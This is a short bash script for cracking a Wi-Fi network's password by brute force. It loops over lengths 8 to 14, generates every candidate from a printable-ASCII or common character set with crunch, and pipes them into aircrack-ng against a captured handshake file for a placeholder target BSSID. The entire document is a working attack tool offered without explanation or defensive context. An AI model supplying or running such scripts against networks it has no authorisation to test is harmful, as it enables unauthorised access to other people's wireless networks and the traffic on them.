#!/bin/bash

# Set the minimum and maximum password length and character set
min_length=8
max_length=14

# Set the character set
# All ASCII Charset
charset=" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_\`abcdefghijklmnopqrstuvwxyz{|}~"

# Common Charset
#charset="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+'\""


# Define the BSSID (replace with the target Wi-Fi network's BSSID)
bssid="00:00:00:00:00:00"

# Define the capture file (replace with the actual capture file)
capture_file="wifi.cap"

# Loop to generate and test passwords
for ((length = min_length; length <= max_length; length++)); do
    echo "Generating and testing passwords of length $length..."
    crunch $length $length $charset | aircrack-ng -w - -b $bssid $capture_file
done

